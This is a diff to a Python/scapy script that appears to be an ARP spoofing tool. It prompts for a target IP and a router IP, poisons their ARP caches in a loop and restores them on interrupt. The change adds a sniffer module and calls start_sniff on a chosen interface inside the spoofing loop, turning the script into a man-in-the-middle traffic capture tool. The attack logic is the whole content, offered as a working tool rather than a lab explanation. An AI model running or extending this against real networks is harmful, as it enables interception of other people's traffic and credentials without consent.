@@ -2,7 +2,7 @@
 import time
 import subprocess
 import scapy.all as scapy
-
+import sniffer
 
 target_ip = ""
 router_ip = ""
@@ -42,13 +42,15 @@ def restore(target_ip, router_ip):
 
 
 # Main funtion to control the exuction of other functions
-def start_spoof():
+def start_spoof(interface):
     global target_ip
     global router_ip
+
     target_ip =  input("Enter target ip: ")
     router_ip = input("Enter router ip address: ")
 
     set_packet_count = 0 
+
     try:
         while True:
             spoof(str(target_ip), str(router_ip))
@@ -56,9 +58,12 @@ def start_spoof():
             set_packet_count += 2
             print(f"\r[+] Packet sent: {str(set_packet_count)}", end="")
             time.sleep(2)
-        print("\n")
+            sniffer.start_sniff(interface)
+
+
     except KeyboardInterrupt:
         print("\nStopping...")
         restore(target_ip, router_ip)
+
     except PermissionError:
         print("Run the program as root")
